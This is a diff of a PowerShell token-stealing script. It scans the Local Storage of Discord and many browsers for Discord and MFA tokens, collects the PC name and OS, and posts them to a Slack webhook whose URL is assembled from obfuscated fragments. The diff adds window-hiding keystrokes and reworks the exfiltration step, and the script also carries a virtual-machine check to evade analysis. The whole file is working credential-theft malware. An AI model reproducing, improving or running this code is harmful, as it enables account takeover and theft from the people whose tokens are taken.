@@ -1,20 +1,23 @@
 
 
 $uriSlack = "https://h"+"ook"+"s.sla"+"ck"+".com/serv"+"ices/T01Q"+"U9DSY2U/B050"+"L0VV73R/"+"2Xf6XxXxhAXOO"+"zgxxWrz9Tf3"
-
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName Microsoft.VisualBasic
+[Microsoft.VisualBasic.Interaction]::AppActivate("Windows PowerShell")
+[System.Windows.Forms.SendKeys]::SendWait("% n")
 $roaming=$env:APPDATA
 $local=$env:LOCALAPPDATA
 $db_path=@("$roaming\Discord\Local Storage\leveldb","$roaming\discordcanary\Local Storage\leveldb","$roaming\discordptb\Local Storage\leveldb","$roaming\Lightcord\Local Storage\leveldb","$roaming\DiscordDevelopment\Local Storage\leveldb","$roaming\Opera Software\Opera Stable\Local Storage\leveldb","$roaming\Opera Software\Opera GX Stable\Local Storage\leveldb","$local\Amigo\User Data\Local Storage\leveldb","$local\Torch\User Data\Local Storage\leveldb","$local\Kometa\User Data\Local Storage\leveldb","$local\Orbitum\User Data\Local Storage\leveldb","$local\CentBrowser\User Data\Local Storage\leveldb","$local\7Star\7Star\User Data\Local Storage\leveldb","$local\Sputnik\Sputnik\User Data\Local Storage\leveldb","$local\Vivaldi\User Data\Default\Local Storage\leveldb","$local\Google\Chrome SxS\User Data\Local Storage\leveldb","$local\Epic Privacy Browser\User Data\Local Storage\leveldb","$local\Google\Chrome\User Data\Default\Local Storage\leveldb","$local\uCozMedia\Uran\User Data\Default\Local Storage\leveldb","$local\Microsoft\Edge\User Data\Default\Local Storage\leveldb","$local\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb","$local\Opera Software\Opera Neon\User Data\Default\Local Storage\leveldb","$local\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb")
 $vmcheck = Get-WmiObject -Query "Select * From Win32_CacheMemory"
 if (!$vmcheck) {Stop-Process -Id $pid -Force} else {
-    echo $uriSlack
+    
     $token = new-object System.Collections.Specialized.StringCollection
     foreach ($path in $db_path) {
         if (Test-Path $path) {
             try {
                 foreach ($file in Get-ChildItem -Path $path -Name) {
                     $data = Get-Content -Path "$($path)\$($file)" -ErrorAction SilentlyContinue -Force
-                    $regex = [regex] "[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"
+                    $regex = [regex] "[\w-]{24}\.[\w-]{6}\.[\w-]{38}|mfa\.[\w-]{84}"
                     $match = $regex.Match($data)
                     while ($match.Success) {
                         if (!$token.Contains($match.Value)) {
@@ -48,46 +51,39 @@ if (!$vmcheck) {Stop-Process -Id $pid -Force} else {
             pcname = $env:COMPUTERNAME
             os = $env:OS
         }
-	
-        #Invoke-RestMethod -Uri "$api/tkns" -Method Post -Headers $tokens -UseBasicParsing -ErrorAction SilentlyContinue
+
+
+        
+        $result = $tokens | ForEach-Object { $_ } | Out-String
+
+
+
+
+        # Construct the payload for the Slack message
+        $payload = @{
+            channel = $uriSlack.Split("/")[-2]
+            text = "Here's a file for you!"
+            attachments = @(
+                @{
+                    fallback = "File upload"
+                    title = "out.txt"
+                    title_link = "https://example.com"
+                    text = $result
+                    color = "good"
+                    
+                }
+            )
+        }
+
+        # Convert the payload to JSON
+        $jsonPayload = $payload | ConvertTo-Json
+
+        # Send the Slack message using the webhook URL
+        Invoke-RestMethod -Uri $uriSlack -Method Post -Body $jsonPayload
+       
     }
 
-    echo $tokens > out.txt
-    $contents = Get-Content -Path .\out.txt
-    echo $contents
     
-    
-
-    # Replace the value in the following variable with the path to the file you want to upload:
-    $filePath = ".\out.txt"
-
-    # Read the contents of the file into a byte array
-    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
-
-    # Convert the byte array to a base64-encoded string
-    $fileData = [System.Convert]::ToBase64String($fileBytes)
-
-    # Construct the payload for the Slack message
-    $payload = @{
-        channel = $uriSlack.Split("/")[-2]
-        text = "Here's a file for you!"
-        attachments = @(
-            @{
-                fallback = "File upload"
-                title = "out.txt"
-                title_link = "https://example.com"
-                text = $fileData
-                color = "good"
-                
-            }
-        )
-    }
-
-    # Convert the payload to JSON
-    $jsonPayload = $payload | ConvertTo-Json
-
-    # Send the Slack message using the webhook URL
-    Invoke-RestMethod -Uri $uriSlack -Method Post -Body $jsonPayload
 
     
 }
